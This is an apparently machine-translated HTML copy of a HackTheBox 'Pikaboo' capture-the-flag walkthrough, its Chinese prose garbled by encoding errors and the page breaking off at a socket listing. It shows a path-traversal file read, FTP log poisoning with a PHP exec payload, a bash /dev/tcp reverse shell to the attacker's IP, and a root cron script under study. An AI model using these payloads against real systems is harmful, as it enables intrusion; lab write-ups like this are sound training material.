<html>
<head>
<title>Pikaboo from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢ç›’å­é‡Œçš„çš®å¡å¸ƒâ€”â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/pikaboo-from-hackthebox-detailed-walkthrough-f66ef4586f31?source=collection_archive---------2-----------------------#2021-12-03">https://infosecwriteups.com/pikaboo-from-hackthebox-detailed-walkthrough-f66ef4586f31?source=collection_archive---------2-----------------------#2021-12-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7f42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="d9d4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/3bcd88eefaef1aaf41904eb3f3a67b3a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*fsTEQmRvno5cKgod.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é»‘å®¢ç›’å­çš®å¡å¸ƒ</figcaption></figure><p id="b9eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Pikabooæ˜¯HackTheBoxä¸Šçš„ç¡¬æœºã€‚æˆ‘ä»¬æœ€åˆçš„æ‰«æåªå‘ç°ä¸‰ä¸ªå¼€æ”¾çš„ç«¯å£ï¼ŒwebæœåŠ¡å™¨æ˜¯æˆ‘ä»¬çš„èµ·ç‚¹ã€‚æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æ¼æ´ï¼Œå®ƒå…è®¸æˆ‘ä»¬è®¿é—®ä¸€ä¸ªç®¡ç†åŒºåŸŸï¼Œä»é‚£é‡Œæˆ‘ä»¬æ¨¡ç³Šå¹¶æ‰¾åˆ°ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚æˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶ä¸­æ¯’æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œç»™æˆ‘ä»¬ä¸€ä¸ªåå‘å¤–å£³ã€‚æˆ‘ä»¬çš„rootè·¯å¾„åŒ…æ‹¬perlè„šæœ¬ã€cronjobsã€ldapæ‰«æï¼Œæœ€ç»ˆæ‰¾åˆ°ftpæœåŠ¡å™¨çš„å‡­è¯ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªæ¼æ´ï¼Œé€šè¿‡åˆ©ç”¨ä¸€ä¸ªå†™å¾—å¾ˆå·®çš„è„šæœ¬æ¥è·å¾—ä¸€ä¸ªåå‘æ ¹å¤–å£³ã€‚</p><p id="e543" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€éœ€æŠ€èƒ½æ˜¯è‰¯å¥½çš„ç½‘ç»œå’Œæ“ä½œç³»ç»Ÿæšä¸¾çŸ¥è¯†ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯ç ”ç©¶åˆ©ç”¨å’Œæœ‰æ¡ä¸ç´Šåœ°æµ‹è¯•ï¼Œä»¥æ‰¾åˆ°ä¸€ä¸ªå·¥ä½œçš„å‰è¿›æ–¹å‘ã€‚</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/360" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">ä¾µå…¥æµ‹è¯•å®éªŒå®¤</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="1f1c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="27c0" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/56adec468ad1580334903d9c13a8a0a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZAjiIaGwxGl0jtbdvnB5ww.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmapæ‰«æè¾“å‡º</figcaption></figure><p id="9ad0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åªæœ‰ä¸‰ä¸ªå¼€æ”¾çš„æ¸¯å£ã€‚é¦–å…ˆï¼Œå°†æœåŠ¡å™¨IPæ·»åŠ åˆ°æˆ‘ä»¬ä¸»æœºçš„æ–‡ä»¶ä¸­:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a9ac" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# echo "10.10.10.249 pikaboo.htb" &gt;&gt; /etc/hosts</span></pre><p id="2b46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨çœ‹çœ‹ç«¯å£80ä¸Šçš„ç½‘ç«™:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nh"><img src="../Images/f546297382d22633787e99d0a03639ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7pjTxkHl4FjibBRM.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">çš®å¡å¸ƒç½‘ç«™</figcaption></figure><p id="1660" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„é™æ€ç½‘ç«™:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ni"><img src="../Images/6f6c4bd25f25e267f92d62c23165469d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*DJQu5dJeV2oalw9D.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">çš®å¡å¸ƒç”Ÿç‰©</figcaption></figure><p id="dd92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸»é¡µé¢ä¸Šæ²¡æœ‰ä»»ä½•å€¼å¾—æ³¨æ„çš„ä¸œè¥¿ï¼Œä½†æ˜¯ç‚¹å‡»ç®¡ç†é“¾æ¥ä¼šæŠŠæˆ‘ä»¬å¸¦åˆ°ä¸€ä¸ªç™»å½•æ¡†ã€‚å¦‚æœæˆ‘ä»¬å–æ¶ˆå®ƒï¼Œæˆ‘ä»¬ä¼šåœ¨è¿™é‡Œç»“æŸ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nj"><img src="../Images/4b2d8ac0e9d66caad4c7a42ac96f0ff6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*k-iHl7q66RH3vP2y.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æœªç»æˆæƒçš„é‡å®šå‘</figcaption></figure><p id="f73b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„Nmapæ‰«æåªå‘ç°Nginxåœ¨ç«¯å£80ä¸Šè¿è¡Œï¼Œä½†è¿™é‡Œæˆ‘ä»¬æœ‰Apacheåœ¨ç«¯å£81ä¸Šè¿è¡Œã€‚localhost IP 127 . 0 . 0 . 1å‘Šè¯‰æˆ‘ä»¬ï¼Œå½“è®¿é—®æ­¤é¡µé¢æ—¶ï¼Œæˆ‘ä»¬æ­£åœ¨æœ¬åœ°é€šè¿‡ç«¯å£80åˆ°81çš„æœºå™¨ã€‚</p><p id="9af1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€äº›æœç´¢å‘ç°<a class="ae nk" href="https://book.hacktricks.xyz/pentesting/pentesting-web/nginx" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ¥è‡ªHacktricksï¼Œå®ƒè§£é‡Šäº†ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æ¼æ´ï¼Œå…è®¸æˆ‘ä»¬è¯»å–webrootä¹‹å¤–çš„æ–‡ä»¶ã€‚</p><p id="f24f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬ç”¨å®ƒæ‰«æä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/a1d0363abb76ce06f6c2847b78b00355.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RQjCGRadGFzOMNS6pUMRKQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Gobusteræ‰«ææœ‰ç”¨çš„æ–‡ä»¶</figcaption></figure><p id="b19d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åœ¨Apache docsç½‘ç«™ä¸Šæ‰¾åˆ°ä¸€ä¸ªæœåŠ¡å™¨çŠ¶æ€é¡µé¢ï¼Œè¿™é‡Œæœ‰è¯¦ç»†çš„<a class="ae nk" href="https://httpd.apache.org/docs/2.4/mod/mod_status.html" rel="noopener ugc nofollow" target="_blank">ä¿¡æ¯</a>ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å¾ˆæœ‰è¶£ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/0525b62522df8ccfc5b69062094cd7db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*y3Dy9SzprLjMnarY.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æœåŠ¡å™¨çŠ¶æ€è¾“å‡º</figcaption></figure><p id="feb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æ‰¾åˆ°æœåŠ¡å™¨ä¿¡æ¯ï¼Œåœ¨åº•éƒ¨ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nn"><img src="../Images/d5c478c3a9155b1891ad14625eca563b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*kZLU-OFmQNJbpdiV.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æœåŠ¡å™¨çŠ¶æ€è¿›ç¨‹åˆ—è¡¨</figcaption></figure><p id="b610" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨è¯¥åˆ—è¡¨ä¸­ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å¦ä¸€ä¸ªåä¸ºadmin_stagingçš„é¡µé¢ï¼Œè®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ä¸ªæ§åˆ¶é¢æ¿:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/cf448657b5c1ad5bc3c7620640b93aa3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gV4jbYXA99a6HMf-.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç®¡ç†ä»ªè¡¨æ¿</figcaption></figure><p id="75a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œä½†æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œå½“æˆ‘ä»¬æµè§ˆæ—¶ï¼ŒURLä¼šå‘ç”Ÿå˜åŒ–:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="23da" class="nc km iq my b gy nd ne l nf ng">http://pikaboo.htb/admin../admin_staging/index.php?page=user.php<br/>http://pikaboo.htb/admin../admin_staging/index.php?page=tables.php<br/>http://pikaboo.htb/admin../admin_staging/index.php?page=typography.php</span></pre><p id="4ad0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥æ¨¡ç³Špage=å‚æ•°ï¼Œçœ‹çœ‹æ˜¯å¦è¿˜æœ‰å…¶ä»–é¡µé¢æ²¡æœ‰æ‰¾åˆ°ã€‚Hacktricksæœ‰ä¸€ä¸ªå¾ˆå¥½çš„æŒ‡å—<a class="ae nk" href="https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/649998366a439312735a93f1d9515fba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qyOEeAzL_4k9JVLRbYtlZg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">éšè—æ–‡ä»¶çš„wfuzz</figcaption></figure><p id="2760" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç»è¿‡å‡ æ¬¡è¿­ä»£ï¼Œæˆ‘æƒ³åˆ°äº†ä¸Šé¢çš„é™åˆ¶è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬åªæ˜¯åšäº†ä¸€äº›æœ‰ç”¨çš„äº‹æƒ…ã€‚vsftpd.logæ–‡ä»¶å‡ ä¹è‚¯å®šä¸æˆ‘ä»¬ä¹‹å‰åœ¨Nmapæ‰«æä¸­å‘ç°çš„FTPæœåŠ¡å™¨æœ‰å…³ã€‚</p><p id="2e34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬æ¥çœ‹çœ‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi np"><img src="../Images/c7523b3ab4ff64eac7e8f8989a4a28a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NYllTAlRafhX-JFPz55eCw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">vsftpdæ³¨é”€</figcaption></figure><p id="3796" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å·²ç»æ£€ç´¢äº†FTPæ—¥å¿—æ–‡ä»¶ï¼Œå…¶ä¸­æ˜¾ç¤ºäº†ç”¨æˆ·åpwnmeowã€‚ç»è¿‡ä¸€æ®µæ—¶é—´çš„è§‚å¯Ÿï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæ¼æ´ï¼Œå¹¶æ‰¾åˆ°äº†è¿™ä¸ªåŒ…å«æ–‡ä»¶çš„æ–¹æ³•ã€‚æ›´å¤šä¿¡æ¯<a class="ae nk" href="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d" rel="noopener">åœ¨è¿™é‡Œ</a>å’Œ<a class="ae nk" href="https://secnhack.in/ftp-log-poisoning-through-lfi/" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>å¸®åŠ©æˆ‘æƒ³å‡ºä¸‹ä¸€æ­¥è¡ŒåŠ¨ã€‚</p><p id="cac0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥è¿æ¥åˆ°FTPæœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨æ‰€æè¿°çš„æ–¹æ³•æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬æµ‹è¯•æˆ‘ä»¬çš„ç†è®º:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="53a9" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): &lt;?php exec("/bin/bash -c 'ping -c 4 10.10.14.43'"); ?&gt;<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.<br/>ftp&gt; quit<br/>221 Goodbye.</span></pre><p id="48e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™å·²å°†æˆ‘ä»¬çš„ä»£ç æ”¾å…¥FTPæ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦è¯»å–æ—¥å¿—ä»¥ä½¿å…¶è¢«æ‰§è¡Œ:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="68bd" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log</span></pre><p id="d1ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç»ˆç«¯ï¼Œä½¿ç”¨tcpdumpç›‘å¬ping:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/271a41111213a0e7194f000305ce6621.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ERxuj189luMBgMM14z8QbQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä»æ¡†ä¸­Pingå›</figcaption></figure><p id="65e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æ•è·æ¥è‡ªæœºå™¨çš„pingï¼Œè¿™è¯æ˜æˆ‘ä»¬æˆåŠŸåœ°æ‰§è¡Œäº†ä»£ç ã€‚è®©æˆ‘ä»¬è¯•ç€å¾—åˆ°ä¸€ä¸ªåå‘çš„shellï¼Œæˆ‘ç”¨äº†ä¸€ä¸ªæ¥è‡ª<a class="ae nk" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> Pentestmonkey </a>çš„ç®€å•shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="df0c" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): &lt;?php exec("/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.43/1337 0&gt;&amp;1'"); ?&gt;<br/>331 Please specify the password.<br/>Password:<br/>530 Login incorrect.<br/>Login failed.<br/>ftp&gt; quit<br/>221 Goodbye.</span></pre><p id="258d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çš„ä»£ç æ”¾åœ¨æ—¥å¿—ä¸­ï¼Œç°åœ¨è¯»å–å®ƒæ¥æ‰§è¡Œ:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6208" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log</span></pre><p id="4752" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢åˆ°ç­‰å¾…ä¸­çš„Netcatç›‘å¬å™¨ï¼ŒæŸ¥çœ‹æˆ‘ä»¬æ˜¯å¦å·²è¿æ¥:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6309" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -lvvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.43] from pikaboo.htb [10.10.10.249] 55792<br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@pikaboo:/var/www/html/admin_staging$</span></pre><p id="9641" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬å…ˆè·å–ç”¨æˆ·æ ‡å¿—:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="28c5" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home<br/>drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow<br/><br/>www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home/pwnmeow<br/>-r--r----- 1 pwnmeow www-data 33 Nov 12 21:55 user.txt<br/><br/>www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="496a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘èŠ±äº†ç›¸å½“å¤šçš„æ—¶é—´å››å¤„æŸ¥çœ‹ï¼Œå½“æˆ‘è¿›å…¥ç³»ç»Ÿcrontabæ—¶ï¼Œæˆ‘æ³¨æ„åˆ°ä¸€äº›æœ‰è¶£çš„äº‹æƒ…:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/a5c1875cb21e12f7e5286e120f2fd205.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XyQDpYIMM08iiuPWqAemtg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">crontabçš„å†…å®¹</figcaption></figure><p id="bdca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ€åä¸€è¡Œä»¥rootç”¨æˆ·èº«ä»½æ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡csvupdate_cronä½œä¸šã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0c47" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ cat /usr/local/bin/csvupdate_cron<br/>cat /usr/local/bin/csvupdate_cron<br/>#!/bin/bash<br/><br/>for d in /srv/ftp/*<br/>do<br/>  cd $d<br/>  /usr/local/bin/csvupdate $(basename $d) *csv<br/>  /usr/bin/rm -rf *<br/>done</span></pre><p id="ddcd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°ï¼Œjobå¾ªç¯éå†/srv/ftpæ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼Œå®ƒéƒ½è¿è¡Œè„šæœ¬csvupdateï¼Œå°†æ–‡ä»¶åä½œä¸ºå‚æ•°ã€‚</p><p id="9ac3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŸ¥çœ‹csvupdateè„šæœ¬ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªå¾ˆé•¿çš„Perlè„šæœ¬:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d374" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ cat /usr/local/bin/csvupdate<br/>#!/usr/bin/perl<br/>##################################################################<br/># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #<br/>#                                                                #<br/># Usage:                                                         #<br/># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #<br/>#                                                                #<br/># Arguments:                                                     #<br/># - type: PokeAPI CSV file type                                  #<br/>#         (must have the correct number of fields)               #<br/># - file(s): list of files containing CSV data                   #<br/>##################################################################<br/><br/>use strict;<br/>use warnings;<br/>use Text::CSV;<br/><br/>my $csv_dir = "/opt/pokeapi/data/v2/csv";</span></pre><p id="e114" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æè¿°å‘Šè¯‰æˆ‘ä»¬å®ƒæ˜¯ç”¨æ¥å‡çº§æ•°æ®çš„ï¼Œè¿›ä¸€æ­¥çœ‹å†…å®¹ï¼Œæˆ‘ä»¬ä¼šåœ¨æœ€åçœ‹åˆ°è¿™ä¸€éƒ¨åˆ†:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2a47" class="nc km iq my b gy nd ne l nf ng">my $csv = Text::CSV-&gt;new({ sep_char =&gt; ',' });<br/>my $fname = "${csv_dir}/${type}.csv";<br/>open(my $fh, "&gt;&gt;", $fname) or die "Unable to open CSV target file.\n";</span></pre><p id="9ae4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™çœ‹èµ·æ¥åƒæ˜¯æ¥å—æ–‡ä»¶åï¼Œæ£€æŸ¥å®ƒçš„ç»“å°¾ã€‚csvï¼Œç„¶åä½¿ç”¨æ‰“å¼€å‘½ä»¤ã€‚æˆ‘ä¸çŸ¥é“ç°åœ¨å»å“ªé‡Œï¼Œæ‰€ä»¥ç»§ç»­è¿›ä¸€æ­¥åˆ—ä¸¾æ–‡ä»¶ç³»ç»Ÿã€‚</p><p id="e2e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“æˆ‘æŸ¥çœ‹å¥—æ¥å­—æ—¶ï¼Œæˆ‘çœ‹åˆ°LDAPåœ¨ç«¯å£389ä¸Šä¾¦å¬127.0.0.1:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="84a9" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/var/www/html/admin_staging$ ss -tln<br/>ss -tln<br/>State     Recv-Q    Send-Q     Local Address:Port       Peer Address:Port    <br/>LISTEN    0         128              0.0.0.0:80         0.0.0.0:*       <br/>LISTEN    0         128            127.0.0.1:81     